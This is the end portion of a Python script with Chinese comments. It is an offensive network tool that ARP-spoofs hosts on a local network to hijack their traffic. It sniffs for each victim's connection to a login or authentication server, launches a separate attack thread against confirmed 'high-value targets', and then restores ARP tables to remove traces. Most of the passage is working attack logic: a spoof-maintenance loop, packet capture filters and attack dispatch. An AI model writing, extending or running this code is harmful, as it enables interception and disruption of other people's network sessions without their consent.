            logging.info(f"    - 估计节省反应时间: {estimated_time_saved:.2f} 秒")
        
        # 获取详细的缓存分析数据
        cache_analytics = get_cache_analytics()
        logging.info(f"  🗂️  情报库状态:")
        logging.info(f"    - 最终规模: {cache_analytics['total']} 个设备")
        if cache_analytics['total'] > 0:
            logging.info(f"    - 新鲜缓存: {cache_analytics['fresh']} 个 (<5min)")
            logging.info(f"    - 老化缓存: {cache_analytics['aging']} 个 (5-15min)")
            logging.info(f"    - 陈旧缓存: {cache_analytics['stale']} 个 (>15min)")
            logging.info(f"    - 平均缓存年龄: {cache_analytics['avg_age']:.1f} 秒")
            
            # 计算缓存利用率
            utilization_rate = stats['cache_hits'] / cache_analytics['total'] * 100 if cache_analytics['total'] > 0 else 0
            logging.info(f"    - 缓存利用率: {utilization_rate:.1f}%")
        
        logging.info("=" * 70)
        logging.info("[*] 🛡️  脚本已安全停止，所有网络已恢复正常。")

# ★【v11.0 核心升级】★
# --------------------------------------------------------------------
#  Scout (侦察兵) 线程函数 - 拦截者版本
#  任务：主动、临时地拦截目标，以确认其攻击价值，任务结束后恢复现场。
# --------------------------------------------------------------------
def scout(target_ip, server_ip, port, iface, timeout, stealth_mode, gateway_info, stats, auth_server=None, auth_port=801):
    """★【v12.1版】★ Scout动态剪枝者：修复竞态条件，确保先动手脚再开监控"""
    
    scout_semaphore.acquire()
    
    target_mac = None  # 在finally块中需要用到，先声明
    try:
        # ★【v12.0 升级】★ 任务中剪枝检查 (第二道防线) - 动态剪枝
        with successful_attack_ips_lock:
            if target_ip in successful_attack_ips:
                logging.debug(f"[Scout-Pruner] 目标 {target_ip} 已被捕获，本侦察任务取消。")
                return  # 直接返回，finally块会确保信号量被释放和scouted_ips清理
        
        # 如果任务依然有效，才开始执行真正的侦察工作
        logging.info(f"[Scout] 派遣侦察兵监视 {target_ip}...")
        
        target_mac = robust_get_mac(target_ip, iface)[0]  # 获取目标MAC
        if not target_mac:
            logging.debug(f"[Scout] 无法获取 {target_ip} 的MAC，侦察任务中止。")
            return

        # ★ 核心升级：确保正确的执行顺序 - 先动手脚，再开监控
        logging.debug(f"[Scout] 对 {target_ip} 启动低频脉冲麻醉以获取视野...")
        
        # ★【v12.1 修复】★ 步骤1: 先同步执行首次欺骗，确保链路已被劫持
        logging.debug(f"[Scout] 对 {target_ip} 执行首次脉冲麻醉...")
        spoof_once(target_ip, target_mac, gateway_info['ip'], iface)
        
        # ★【v12.1 修复】★ 步骤2: 后台线程只负责后续的"维持"任务
        stop_scout_spoof = threading.Event()
        
        def scout_spoof_loop():
            """轻型维持循环，只负责后续的维持工作，不包含首次欺骗"""
            # 注意：首次欺骗已在主线程中完成，这里只负责维持
            while not stop_scout_spoof.is_set():
                time.sleep(5)  # 每5秒维持一次欺骗
                if not stop_scout_spoof.is_set():  # 双重检查避免退出时多余的包
                    spoof_once(target_ip, target_mac, gateway_info['ip'], iface)
        
        # 启动维持线程
        spoof_maintain_thread = threading.Thread(target=scout_spoof_loop, daemon=True)
        spoof_maintain_thread.start()
        
        target_detected = False
        def scout_packet_handler(pkt):
            nonlocal target_detected
            target_detected = True
            logging.info(f"[Scout] 🎯 目标 {target_ip} 正在访问服务器，确认为高价值目标！")
            return True  # 发现目标，立即停止sniff

        # 开始在被欺骗的链路上监听
        try:
            # ★ 精确制导模式：如果指定了认证服务器，优先监听认证流量
            if auth_server:
                scout_filter = f"tcp and src host {target_ip} and dst host {auth_server} and dst port {auth_port}"
                logging.debug(f"[Scout] 精确制导模式: {scout_filter}")
            else:
                scout_filter = f"tcp and src host {target_ip} and dst host {server_ip} and dst port {port}"
                logging.debug(f"[Scout] 标准侦察模式: {scout_filter}")
                
            sniff(
                filter=scout_filter,
                prn=scout_packet_handler,
                store=False, 
                iface=iface, 
                timeout=45,  # 侦察兵生命周期45秒
                stop_filter=lambda pkt: target_detected
            )
        except Exception as e:
            logging.debug(f"[Scout] {target_ip} 监听异常: {e}")
            return
        finally:
            # ★ 关键：无论侦察结果如何，都停止轻型欺骗循环
            stop_scout_spoof.set()
            if spoof_maintain_thread.is_alive():
                spoof_maintain_thread.join(timeout=1.0)
        
        if target_detected:
            logging.info(f"\n[Scout] ✅ 发现高价值目标 {target_ip}！正在访问登录服务器！")
            logging.info(f"[Scout] 🚀 授权攻击！呼叫重型攻击机接管战场...")
            
            # ★【修复】★ 使用专用锁管理attacked_ips
            with attacked_ips_lock:
                if target_ip not in attacked_ips:
                    attacked_ips.add(target_ip)
                    # 由Scout直接启动攻击线程
                    attack_thread = threading.Thread(
                        target=launch_attack_on,
                        args=(target_ip, gateway_info, server_ip, port, iface, timeout, stealth_mode, stats),
                        name=f"Attacker-{target_ip}", 
                        daemon=True
                    )
                    attack_thread.start()
                    
                    # ★【修复】★ 移除cleanup_attack计时器！
                    # attacked_ips的清理现在由launch_attack_on函数在其finally块中负责
                    
                    logging.info(f"[Scout] 🎯 攻击线程已启动：{target_ip}")
                else:
                    logging.debug(f"[Scout] {target_ip} 已在攻击队列中，跳过")
        else:
            logging.debug(f"[Scout] ❌ {target_ip} 侦察超时，未发现可疑活动。")
            
    except Exception as e:
        logging.error(f"[Scout-ERROR] 侦察兵 {target_ip} 出现致命错误: {e}")
    finally:
        # ★ 核心升级 2：任务结束，发射"解药"，恢复现场 ★
        if target_mac:
            logging.debug(f"[Scout] 对 {target_ip} 恢复ARP，抹除侦察痕迹...")
            restore_arp(target_ip, target_mac, gateway_info['ip'], gateway_info['mac'], iface)
        
        # ★【优化】★ 使用专用锁管理scouted_ips
        with scouted_ips_lock:
            scouted_ips.discard(target_ip)  # 使用discard更安全
        scout_semaphore.release()
        logging.debug(f"[Scout] 侦察兵 {target_ip} 任务结束，撤离阵地。")


if __name__ == "__main__":
    main()
